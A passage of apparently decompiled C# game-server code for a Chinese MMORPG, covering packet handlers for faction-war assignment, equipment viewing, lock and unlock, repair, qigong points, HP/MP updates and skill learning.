						系统提示("您属于【仙族】,敌对势力为【黑披风烟雾效果】,如自身披风外观异常,请打开披风效果。", 7, "系统提示");
					}
				}
				else
				{
					System.Buffer.BlockCopy(array, 0, 封包数据, 10, 2);
					System.Buffer.BlockCopy(array, 0, 封包数据, 14, 2);
				}
				break;
			case 3:
				if (Buffer.ToInt16(array2, 0) != 1)
				{
					break;
				}
				if (base.人物坐标_地图 == 801)
				{
					return;
				}
				if (base.Player_Job_leve >= 2 && base.人物坐标_地图 != 801)
				{
					System.Buffer.BlockCopy(Buffer.GetBytes(2), 0, 封包数据, 10, 2);
					System.Buffer.BlockCopy(Buffer.GetBytes(2), 0, 封包数据, 14, 2);
					if (World.势力战正人数 == World.势力战邪人数)
					{
						World.势力战正人数++;
						base.势力战派别 = "仙族";
						if (World.是否开启共用银币市场 == 1)
						{
							World.conn.发送("势力战人数|" + World.势力战正人数 + "|" + World.势力战邪人数);
							换线移动(520f, 0f, 15f, 801);
						}
						else
						{
							移动(520f, 0f, 15f, 801);
						}
						系统提示("您属于【仙族】,敌对势力为【黑披风烟雾效果】,如自身披风外观异常,请打开披风效果。", 7, "系统提示");
					}
					else if (World.势力战正人数 > World.势力战邪人数)
					{
						World.势力战邪人数++;
						base.势力战派别 = "魔族";
						if (World.是否开启共用银币市场 == 1)
						{
							World.conn.发送("势力战人数|" + World.势力战正人数 + "|" + World.势力战邪人数);
							换线移动(-520f, 0f, 15f, 801);
						}
						else
						{
							移动(-520f, 0f, 15f, 801);
						}
						系统提示("您属于【魔族】,敌对势力为【白披风】,如自身披风外观异常,请打开披风效果。", 7, "系统提示");
					}
					else if (World.势力战正人数 < World.势力战邪人数)
					{
						World.势力战正人数++;
						base.势力战派别 = "仙族";
						if (World.是否开启共用银币市场 == 1)
						{
							World.conn.发送("势力战人数|" + World.势力战正人数 + "|" + World.势力战邪人数);
							换线移动(520f, 0f, 15f, 801);
						}
						else
						{
							移动(520f, 0f, 15f, 801);
						}
						系统提示("您属于【仙族】,敌对势力为【黑披风烟雾效果】,如自身披风外观异常,请打开披风效果。", 7, "系统提示");
					}
				}
				else
				{
					System.Buffer.BlockCopy(array, 0, 封包数据, 10, 2);
					System.Buffer.BlockCopy(array, 0, 封包数据, 14, 2);
				}
				break;
			case 4:
				switch (Buffer.ToInt16(array2, 0))
				{
				case 2:
					死亡移动(0f, 0f, 15f, 801);
					break;
				case 1:
					if (Buffer.IsEquals(base.势力战派别, "仙族"))
					{
						死亡移动(520f, 0f, 15f, 801);
					}
					else
					{
						死亡移动(-520f, 0f, 15f, 801);
					}
					break;
				}
				base.人物_HP = base.人物最大_HP;
				更新HP_MP_SP();
				base.Player死亡 = false;
				break;
			}
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, 封包数据, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(封包数据, 封包数据.Length);
			}
		}

		public void 查看装备(byte[] 封包数据, int 封包大小)
		{
			int num = BitConverter.ToInt32(封包数据, 14);
			Players players = 得到人物数据(num);
			if (players != null && num != base.人物全服ID)
			{
				发包类 发包类 = new 发包类();
				发包类.Write4(1);
				发包类.Write2(num);
				发包类.Write2(0);
				for (int i = 0; i < 15; i++)
				{
					发包类.Write(players.装备栏已穿装备[i].GetByte());
				}
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(players.装备栏已穿装备[15].GetByte());
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 4889, base.人物全服ID);
				}
			}
		}

		public void 组队道具分配规则(byte[] data, int length)
		{
			int int_ = BitConverter.ToInt16(data, 4);
			int num = BitConverter.ToInt16(data, 10);
			if (得到人物数据(int_) != null)
			{
				发包类 发包类 = new 发包类();
				发包类.Write2(1);
				发包类.Write2(num);
				组队Class value;
				if (World.W组队.TryGetValue(组队id, out value))
				{
					value.道具分配规则 = num;
					foreach (Players value2 in value.队员列表.Values)
					{
						if (value2.Client != null)
						{
							value2.Client.SendPak(发包类, 11008, value2.人物全服ID);
						}
					}
				}
			}
		}

		public void 设置副本难度(byte[] 封包数据, int 封包大小)
		{
			int int_ = BitConverter.ToInt16(封包数据, 4);
			int value = BitConverter.ToInt16(封包数据, 10);
			if (得到人物数据(int_) != null)
			{
				发包类 发包类 = new 发包类();
				发包类.Write(value);
				组队Class value2;
				if (World.W组队.TryGetValue(组队id, out value2))
				{
					foreach (Players value3 in value2.队员列表.Values)
					{
						if (value3.Client != null)
						{
							value3.Client.SendPak(发包类, 8729, value3.人物全服ID);
						}
					}
				}
			}
		}

		public void 穿针引线(byte[] 封包数据, int 封包大小)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA552A002C01E1001C00030014DC143C00000000000001000000010000000000000000000000000000000000000055AA");
				int num = 封包数据[24];
				int 位置 = 封包数据[20];
				byte[] 物品ID = 装备栏包裹[num].物品ID;
				ItmeClass value;
				if (World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out value) && value.FLD_RESIDE2 == 1)
				{
					byte[] 物品ID2 = new byte[4];
					byte[] array2 = new byte[57];
					byte[] 物品全局ID = 装备栏包裹[num].物品全局ID;
					string text = 装备栏包裹[num].Get物品ID.ToString().Substring(1, 1);
					System.Buffer.BlockCopy(装备栏包裹[num].物品_byte, 16, array2, 0, 57);
					switch (text)
					{
					case "2":
						物品ID2 = BitConverter.GetBytes(BitConverter.ToInt32(物品ID, 0) - 10000000);
						break;
					case "1":
						物品ID2 = BitConverter.GetBytes(BitConverter.ToInt32(物品ID, 0) + 10000000);
						break;
					}
					减去物品(num, 1);
					减去物品(位置, 1);
					增加物品(物品全局ID, 物品ID2, num, BitConverter.GetBytes(1), array2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "使用穿针引线  出错  [" + base.Userid + "][" + base.UserName + "]  " + ex.Message);
			}
		}

		public void 登记玉连环(byte[] data, int length)
		{
			byte[] array = Converter.hexStringToByte("AA5532002C01C600240002000000E5EA0D00000000000000000000000000E6EA0D0000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(data, 10, array, 18, 12);
			System.Buffer.BlockCopy(data, 22, array, 34, 12);
			玉连环.Clear();
			for (int i = 0; i < 6; i++)
			{
				byte[] array2 = new byte[4];
				try
				{
					System.Buffer.BlockCopy(data, i * 4 + 10, array2, 0, 4);
					if (BitConverter.ToInt32(array2, 0) != 0)
					{
						玉连环.Add(BitConverter.ToInt32(array2, 0));
					}
				}
				catch
				{
				}
			}
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
				系统提示("玉连环登记成功", 9, "系统提示");
			}
		}

		public void 装备加解锁(byte[] data, int length)
		{
			if (World.是否开启装备加解锁功能 == 0)
			{
				系统提示("装备加解锁功能未开放,请联系客服人员。");
				return;
			}
			int num = data[10];
			int num2 = data[11];
			if (num2 < 0)
			{
				return;
			}
			查百宝阁元宝数();
			switch (num)
			{
			case 1:
			{
				byte[] array = Converter.hexStringToByte("AA5510002C01DF0002000101000000000000E98955AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				break;
			}
			case 3:
			{
				if (World.装备加锁消耗元宝 > 0)
				{
					if (base.FLD_RXPIONT < World.装备加锁消耗元宝 * num2)
					{
						系统提示("元宝不够了，加锁一件装备需要" + World.装备加锁消耗元宝 + "个元宝。");
						goto default;
					}
					检察元宝数据(World.装备加锁消耗元宝 * num2, 0);
					保存元宝数据();
					RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "加锁装备消耗", 1, World.装备加锁消耗元宝 * num2);
				}
				for (int i = 0; i < num2; i++)
				{
					int num3 = data[29 + i * 18];
					byte[] array2 = new byte[56];
					装备栏包裹[num3].物品绑定 = true;
					装备栏包裹[num3].锁定 = true;
					byte[] 物品ID = 装备栏包裹[num3].物品ID;
					byte[] 物品全局ID = 装备栏包裹[num3].物品全局ID;
					System.Buffer.BlockCopy(装备栏包裹[num3].物品_byte, 16, array2, 0, World.物品属性大小);
					减去物品(num3, 1);
					增加物品(物品全局ID, 物品ID, num3, BitConverter.GetBytes(1), array2, true);
				}
				goto default;
			}
			case 4:
				if (World.装备解锁消耗元宝 > 0)
				{
					if (base.FLD_RXPIONT < World.装备解锁消耗元宝 * num2)
					{
						系统提示("元宝不够了，解锁一件装备需要" + World.装备解锁消耗元宝 + "个元宝。");
						goto default;
					}
					检察元宝数据(World.装备解锁消耗元宝 * num2, 0);
					保存元宝数据();
					RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "解锁装备消耗", 1, World.装备解锁消耗元宝 * num2);
				}
				if (安全码是否通过验证)
				{
					解锁装备(data, num2);
					goto default;
				}
				解锁包 = data;
				解锁数量 = num2;
				发送安全码消息(8);
				break;
			default:
				发送加解锁装备数据();
				break;
			}
		}

		public void 发送加解锁装备数据()
		{
			byte[] array = Converter.hexStringToByte("AA5510002C01DF0002000101000000000000E98955AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 解锁装备(byte[] data, int 数量)
		{
			try
			{
				for (int i = 0; i < 数量; i++)
				{
					int num = data[30 + i * 18];
					byte[] array = new byte[56];
					装备栏包裹[num].物品绑定 = false;
					装备栏包裹[num].锁定 = false;
					byte[] 物品ID = 装备栏包裹[num].物品ID;
					byte[] 物品全局ID = 装备栏包裹[num].物品全局ID;
					System.Buffer.BlockCopy(装备栏包裹[num].物品_byte, 16, array, 0, World.物品属性大小);
					减去物品(num, 1);
					增加物品(物品全局ID, 物品ID, num, Buffer.GetBytes(1), array, false);
				}
			}
			catch
			{
			}
		}

		public void 装备修理(byte[] 封包数据, int 封包大小)
		{
			byte[] array = Converter.hexStringToByte("AA556A00000025315C00000000000A000000FEFFFFFF00000000B580FA0500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010A755AA");
			byte[] array2 = new byte[2];
			byte[] array3 = new byte[2];
			System.Buffer.BlockCopy(封包数据, 10, array2, 0, 2);
			System.Buffer.BlockCopy(封包数据, 14, array3, 0, 2);
			int num = BitConverter.ToInt16(array2, 0);
			int num2 = BitConverter.ToInt16(array3, 0);
			int num3 = BitConverter.ToInt16(封包数据, 22);
			if (num == 1)
			{
				switch (num2)
				{
				case 13:
				{
					int num6 = 0;
					for (int k = 0; k < 6; k++)
					{
						ItmeClass value3;
						if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏已穿装备[k].物品ID, 0), out value3) && (value3.FLD_RESIDE2 == 1 || value3.FLD_RESIDE2 == 2 || value3.FLD_RESIDE2 == 4 || value3.FLD_RESIDE2 == 5 || value3.FLD_RESIDE2 == 6) && value3.FLD_NJ > 0 && !装备栏已穿装备[k].锁定 && !装备栏已穿装备[k].锁定 && !装备栏已穿装备[k].物品绑定 && !装备栏已穿装备[k].物品绑定 && 装备栏已穿装备[k].FLD_FJ_NJ != value3.FLD_NJ)
						{
							num6 += value3.FLD_NJ - 装备栏已穿装备[k].FLD_FJ_NJ;
						}
					}
					if (num6 == 0)
					{
						修理提示1(num, num2, 251, 0L);
						return;
					}
					System.Buffer.BlockCopy(array2, 0, array, 10, 2);
					System.Buffer.BlockCopy(array3, 0, array, 14, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 34, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(num6), 0, array, 42, 4);
					break;
				}
				case 12:
				{
					int num4 = 0;
					for (int i = 0; i < 6; i++)
					{
						ItmeClass value;
						if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏已穿装备[i].物品ID, 0), out value) && (value.FLD_RESIDE2 == 1 || value.FLD_RESIDE2 == 2 || value.FLD_RESIDE2 == 4 || value.FLD_RESIDE2 == 5 || value.FLD_RESIDE2 == 6) && value.FLD_NJ > 0 && !装备栏已穿装备[i].锁定 && !装备栏已穿装备[i].锁定 && !装备栏已穿装备[i].物品绑定 && !装备栏已穿装备[i].物品绑定 && 装备栏已穿装备[i].FLD_FJ_NJ != value.FLD_NJ)
						{
							num4 += value.FLD_NJ - 装备栏已穿装备[i].FLD_FJ_NJ;
						}
					}
					if (base.Player_WuXun < num4)
					{
						修理提示1(num, num2, 253, 装备栏包裹[num3].Get物品ID);
						系统提示("武勋不足" + num4 + "，不能继续修理物品。");
						return;
					}
					for (int j = 0; j < 6; j++)
					{
						ItmeClass value2;
						if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏已穿装备[j].物品ID, 0), out value2) && (value2.FLD_RESIDE2 == 1 || value2.FLD_RESIDE2 == 2 || value2.FLD_RESIDE2 == 4 || value2.FLD_RESIDE2 == 5 || value2.FLD_RESIDE2 == 6) && value2.FLD_NJ > 0 && !装备栏已穿装备[j].锁定 && !装备栏已穿装备[j].锁定 && !装备栏已穿装备[j].物品绑定 && !装备栏已穿装备[j].物品绑定 && 装备栏已穿装备[j].FLD_FJ_NJ != value2.FLD_NJ)
						{
							int num5 = value2.FLD_NJ - 装备栏已穿装备[j].FLD_FJ_NJ;
							if (BitConverter.ToInt32(装备栏已穿装备[j].物品ID, 0) != 0)
							{
								装备栏已穿装备[j].FLD_FJ_NJ = value2.FLD_NJ;
								base.Player_WuXun -= num5;
							}
						}
					}
					System.Buffer.BlockCopy(array2, 0, array, 10, 2);
					System.Buffer.BlockCopy(array3, 0, array, 14, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(num4), 0, array, 42, 4);
					初始化已装备物品();
					计算人物装备数据();
					更新武功和状态();
					break;
				}
				}
			}
			else
			{
				switch (num2)
				{
				case 10:
					try
					{
						if (装备栏包裹[num3].锁定 || 装备栏包裹[num3].物品绑定)
						{
							return;
						}
						合成物品表.Clear();
						if (合成物品表.ContainsKey(1))
						{
							return;
						}
						ItmeClass value6;
						if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0), out value6))
						{
							if (value6.FLD_RESIDE2 != 1 && value6.FLD_RESIDE2 != 2 && value6.FLD_RESIDE2 != 4 && value6.FLD_RESIDE2 != 5 && value6.FLD_RESIDE2 != 6)
							{
								return;
							}
							if (装备栏包裹[num3].FLD_FJ_NJ == value6.FLD_NJ)
							{
								修理提示1(num, num2, 254, 装备栏包裹[num3].Get物品ID);
								return;
							}
							if (value6.FLD_NJ <= 0)
							{
								修理提示1(num, num2, 255, 装备栏包裹[num3].Get物品ID);
								return;
							}
						}
						if (base.Player_WuXun < value6.FLD_NJ - 装备栏包裹[num3].FLD_FJ_NJ)
						{
							系统提示("武勋不足" + (value6.FLD_NJ - 装备栏包裹[num3].FLD_FJ_NJ) + "，不能修理此物品。");
							return;
						}
						System.Buffer.BlockCopy(array2, 0, array, 10, 2);
						System.Buffer.BlockCopy(array3, 0, array, 14, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(num3), 0, array, 22, 4);
						System.Buffer.BlockCopy(装备栏包裹[num3].物品ID, 0, array, 26, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 34, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(value6.FLD_NJ - 装备栏包裹[num3].FLD_FJ_NJ), 0, array, 42, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(装备栏包裹[num3].FLD_FJ_NJ), 0, array, 90, 4);
						HcItimesClass hcItimesClass2 = new HcItimesClass();
						hcItimesClass2.位置 = num3;
						hcItimesClass2.物品 = 装备栏包裹[num3].物品_byte;
						装备栏包裹[num3].锁定 = true;
						合成物品表.Add(1, hcItimesClass2);
					}
					catch (Exception ex3)
					{
						Form1.WriteLine(1, "装备修理_放装备出错![" + base.Userid + "]-[" + base.UserName + "]" + ex3.Message);
						return;
					}
					break;
				case 11:
					try
					{
						HcItimesClass value5;
						if (合成物品表.TryGetValue(1, out value5))
						{
							装备栏包裹[value5.位置].锁定 = false;
							合成物品表.Clear();
							System.Buffer.BlockCopy(array2, 0, array, 10, 2);
							System.Buffer.BlockCopy(array3, 0, array, 14, 2);
							合成系统解锁();
						}
						System.Buffer.BlockCopy(array2, 0, array, 10, 2);
						System.Buffer.BlockCopy(array3, 0, array, 14, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(num3), 0, array, 22, 4);
						System.Buffer.BlockCopy(装备栏包裹[num3].物品ID, 0, array, 26, 4);
					}
					catch (Exception ex2)
					{
						Form1.WriteLine(1, "装备修理_取消出错![" + base.Userid + "]-[" + base.UserName + "]" + ex2.Message);
						return;
					}
					break;
				case 12:
					try
					{
						if (合成物品表.Count <= 0)
						{
							return;
						}
						HcItimesClass hcItimesClass = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass = 合成物品表[1];
						}
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass.物品全局ID, 0))
						{
							return;
						}
						if (装备栏包裹[hcItimesClass.位置].物品绑定)
						{
							系统提示("绑定物品不能修理。");
							return;
						}
						ItmeClass value4;
						if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass.物品id, 0), out value4))
						{
							return;
						}
						int num7 = value4.FLD_NJ - hcItimesClass.FLD_FJ_NJ;
						if (BitConverter.ToInt32(装备栏包裹[hcItimesClass.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass.物品全局ID, 0))
						{
							装备栏包裹[hcItimesClass.位置].FLD_FJ_NJ = value4.FLD_NJ;
							base.Player_WuXun -= num7;
						}
						装备栏包裹[hcItimesClass.位置].锁定 = false;
						System.Buffer.BlockCopy(array2, 0, array, 10, 2);
						System.Buffer.BlockCopy(array3, 0, array, 14, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(hcItimesClass.位置), 0, array, 22, 4);
						System.Buffer.BlockCopy(装备栏包裹[hcItimesClass.位置].物品_byte, 8, array, 26, World.物品属性大小);
						System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 34, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(num7), 0, array, 42, 4);
						合成物品表.Clear();
						合成系统解锁();
						初始化装备篮包裹();
						计算人物装备数据();
						更新武功和状态();
					}
					catch (Exception ex)
					{
						Form1.WriteLine(1, "装备修理_ 修理出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
						return;
					}
					break;
				}
			}
			if (num != 0)
			{
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
		}

		public void 修理提示1(int 操作ID, int 修理ID, int type, long 物品ID)
		{
			byte[] array = Converter.hexStringToByte("AA556A00000025315C00FFFFFFFF0A000000FFFFFFFF00000000B580FA0500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010A755AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(修理ID), 0, array, 14, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(type), 0, array, 18, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(物品ID), 0, array, 26, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 加气功点(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			if (base.Player_Qigong_point >= 1)
			{
				try
				{
					byte[] array = new byte[2];
					System.Buffer.BlockCopy(封包数据, 70, array, 0, 2);
					int num = BitConverter.ToUInt16(array, 0);
					if (World.普通气功ID.Contains(num))
					{
						for (int i = 0; i < 12; i++)
						{
							byte[] array2 = new byte[2];
							System.Buffer.BlockCopy(封包数据, 10 + i * 4, array2, 0, 2);
							if (BitConverter.ToInt16(array2, 0) == num)
							{
								if (BitConverter.ToInt16(气功[i].气功_byte, 0) >= 20)
								{
									return;
								}
								int num2 = BitConverter.ToInt16(气功[i].气功_byte, 0) + 1;
								int num3 = --base.Player_Qigong_point;
								if (num2 > 20)
								{
									num2 = 20;
								}
								BitConverter.GetBytes(num2);
								气功[i].气功量 = num2;
							}
						}
						goto IL_012d;
					}
					升天气功类 value;
					if (!升天气功.TryGetValue(num, out value) || value.气功量 >= 20)
					{
						goto IL_012d;
					}
					if (value.气功量 < 20)
					{
						int num4 = value.气功量 + 1;
						int num3 = --base.Player_Qigong_point;
						if (num4 > 20)
						{
							num4 = 20;
						}
						value.气功量 = num4;
						goto IL_012d;
					}
					goto end_IL_0013;
					IL_012d:
					更新气功();
					更新武功和状态();
					更新HP_MP_SP();
					end_IL_0013:;
				}
				catch (Exception)
				{
					系统提示("请用官服最新客户端");
				}
			}
		}

		public void 更新HP_MP_SP()
		{
			try
			{
				if (组队id == 0 && GetAddState(1000000050))
				{
					追加状态列表[1000000050].时间结束事件();
				}
				if (base.人物_SP > base.人物最大_SP)
				{
					base.人物_SP = 0;
					if (base.Player_Job == 6)
					{
						怒气++;
						if (怒气 > 5)
						{
							怒气 = 5;
						}
					}
					else if (base.Player_Job == 7)
					{
						int num = 0;
						if (GetAddState(901301))
						{
							if (base.上河调计数 >= 3)
							{
								base.上河调计数 = 0;
							}
							switch (base.上河调计数)
							{
							case 1:
							case 2:
								num = 900403;
								break;
							case 0:
								num = 900401;
								break;
							}
							if (num != 0 && !GetAddState(900401) && !GetAddState(900402) && !GetAddState(900403))
							{
								switch (num)
								{
								case 900401:
									base.琴师状态 = 16;
									break;
								case 900402:
									base.琴师状态 = 32;
									break;
								case 900403:
									base.琴师状态 = 64;
									break;
								}
								追加状态类 value = new 追加状态类(this, 60000, num, 0);
								追加状态列表.Add(num, value);
								状态效果(Buffer.GetBytes(num), 1, 60000);
								int num2 = ++base.上河调计数;
							}
						}
						else if (GetAddState(901302))
						{
							if (base.下河调计数 >= 3)
							{
								base.下河调计数 = 0;
							}
							switch (base.下河调计数)
							{
							case 1:
							case 2:
								num = 900402;
								break;
							case 0:
								num = 900401;
								break;
							}
							if (num != 0 && !GetAddState(900401) && !GetAddState(900402) && !GetAddState(900403))
							{
								switch (num)
								{
								case 900401:
									base.琴师状态 = 16;
									break;
								case 900402:
									base.琴师状态 = 32;
									break;
								case 900403:
									base.琴师状态 = 64;
									break;
								}
								追加状态类 value2 = new 追加状态类(this, 60000, num, 0);
								追加状态列表.Add(num, value2);
								状态效果(Buffer.GetBytes(num), 1, 60000);
								int num2 = ++base.下河调计数;
							}
						}
						else if (GetAddState(901303) && 玉连环 != null)
						{
							if (base.玉连环计数 >= 6)
							{
								base.玉连环计数 = 0;
							}
							switch (base.玉连环计数)
							{
							case 0:
								num = 玉连环[0];
								break;
							case 1:
								num = 玉连环[1];
								break;
							case 2:
								num = 玉连环[2];
								break;
							case 3:
								num = 玉连环[3];
								break;
							case 4:
								num = 玉连环[4];
								break;
							case 5:
								num = 玉连环[5];
								break;
							}
							if (num != 0 && !GetAddState(900401) && !GetAddState(900402) && !GetAddState(900403))
							{
								switch (num)
								{
								case 900401:
									base.琴师状态 = 16;
									break;
								case 900402:
									base.琴师状态 = 32;
									break;
								case 900403:
									base.琴师状态 = 64;
									break;
								}
								追加状态类 value3 = new 追加状态类(this, 60000, num, 0);
								追加状态列表.Add(num, value3);
								状态效果(Buffer.GetBytes(num), 1, 60000);
								int num2 = ++base.玉连环计数;
							}
						}
						更新人物数据(this);
						更新广播人物数据();
					}
					else if (!GetAddState(700014))
					{
						int num3 = 10000 + (int)base.狂风万破;
						怒 = true;
						追加状态类 value4;
						if (base.Player_Job == 3)
						{
							double num4 = 0.25 + base.枪_末日狂舞;
							value4 = new 追加状态类(this, num3, 700014, 0, num4);
							addFLD_追加百分比_攻击(num4);
							addFLD_追加百分比_防御(num4);
						}
						else if (base.Player_Job == 5)
						{
							num3 = 10000 + (int)base.升天一气功_狂风天意 * 3000 + 3000;
							value4 = new 追加状态类(this, num3, 700014, 0);
							addFLD_追加百分比_攻击(0.15);
							addFLD_追加百分比_防御(0.2);
						}
						else if (base.Player_Job == 10)
						{
							double num5 = 0.25 + base.拳师_末日狂舞;
							value4 = new 追加状态类(this, num3, 700014, 0, num5);
							addFLD_追加百分比_攻击(num5);
							addFLD_追加百分比_防御(num5);
							拳师会心一击威力 = 0.3;
							拳师会心一击威力 += base.拳_升天三气功_精益求精;
						}
						else if (base.Player_Job == 11)
						{
							num3 = (int)base.梅_玄武神功 + 10000;
							double num6 = (int)(base.梅_障力运用 * 1.2);
							value4 = new 追加状态类(this, num3, 700014, 0, num6);
							addFLD_追加百分比_攻击(0.2);
							base.人物基本最大_障力 = (int)((double)base.人物基本最大_障力 * 1.2 + 0.5);
							base.梅_障力运用 += num6;
						}
						else
						{
							value4 = new 追加状态类(this, num3, 700014, 0);
							addFLD_追加百分比_攻击(0.25);
							addFLD_追加百分比_防御(0.25);
						}
						if (检查红月狂风状态())
						{
							base.FLD_人物_追加_攻击 += 150;
							base.FLD_人物_追加_防御 += 150;
						}
						追加状态列表.Remove(700014);
						追加状态列表.Add(700014, value4);
						状态效果(Buffer.GetBytes(700014), 1, num3);
						更新人物数据(this);
						更新广播人物数据();
						更新武功和状态();
					}
				}
				if (base.人物_HP > base.人物最大_HP)
				{
					base.人物_HP = base.人物最大_HP;
				}
				if (base.人物_MP > base.人物最大_MP)
				{
					base.人物_MP = base.人物最大_MP;
				}
				if (base.人物_AP > base.人物最大_AP)
				{
					base.人物_AP = base.人物最大_AP;
				}
				if (base.人物_HP < 0)
				{
					base.人物_HP = base.人物最大_HP;
				}
				if (base.人物_MP < 0)
				{
					base.人物_MP = base.人物最大_MP;
				}
				if (base.人物_AP < 0)
				{
					base.人物_AP = base.人物最大_AP;
				}
				发包类 发包类 = new 发包类();
				发包类.Write4(0);
				发包类.Write4(base.人物_HP);
				发包类.Write4(base.人物_MP);
				发包类.Write4(base.人物_SP);
				发包类.Write4(base.人物最大_HP);
				发包类.Write4(base.人物最大_MP);
				发包类.Write4(base.人物最大_SP);
				发包类.Write4(怒气);
				if (base.Player_Job == 11)
				{
					发包类.Write4(base.人物最大_AP);
					发包类.Write4(base.人物_AP);
					发包类.Write4((int)base.梅_障力运用 + base.FLD_装备_追加_障力恢复量);
				}
				else
				{
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
				}
				发包类.Write(0);
				发包类.Write(怒点);
				发包类.Write2(0);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 26880, base.人物全服ID);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "更新HP_MP_SP      出错      [" + base.Userid + "][" + base.UserName + "]      " + ex.Message);
			}
		}

		public void 学习技能包(byte[] 封包数据, int 封包大小)
		{
			PacketReader packetReader = new PacketReader(封包数据, 封包大小, false);
			packetReader.Seek(4, SeekOrigin.Begin);
			int num = packetReader.ReadInt16();
			packetReader.Seek(10, SeekOrigin.Begin);
			int num2 = packetReader.ReadInt32();
			武功类 value2;
			if (num == base.人物全服ID)
			{
				武功类 value;
				if (!World.TBL_KONGFU.TryGetValue(num2, out value))
				{
					return;
				}
				if (base.Player_Level < value.FLD_LEVEL)
				{
					系统提示("人物等级达到" + value.FLD_LEVEL + "级,才能修炼。");
					return;
				}
				if (base.Player_Job_leve < value.FLD_JOBLEVEL)
				{
					系统提示("人物转职达到" + value.FLD_JOBLEVEL + "转,才能修炼。");
					return;
				}
				if (base.Player_ExpErience < value.FLD_NEEDEXP)
				{
					系统提示("历练达到" + value.FLD_NEEDEXP + ",才能修炼。");
					return;
				}
				武功类 武功类 = new 武功类(num2);
				if (base.Player_Job != 8 && base.Player_Job != 9 && base.Player_Job != 13)
				{
					武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX] = 武功类;
					base.Player_ExpErience -= value.FLD_NEEDEXP;
				}
				else if (武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX] != null && 武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 != 0)
				{
					if (武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 >= value.FLD_武功最高级别)
					{
						武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 = value.FLD_武功最高级别;
						return;
					}
					int num3 = 武功类.FLD_LEVEL;
					if (武功类.FLD_LEVEL <= 1)
					{
						num3 = 0;
					}
					int num4 = 武功类.FLD_NEEDEXP + 武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 * value.FLD_每级加历练;
					int num5 = num3 + 武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 * value.FLD_每级加修炼等级;
					int num6 = 武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 * value.FLD_每级武功点数;
					if (武功类.FLD_PID == 1000501)
					{
						if (武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 == 2)
						{
							num4 = 250000;
						}
					}
					else if (武功类.FLD_PID == 1000402)
					{
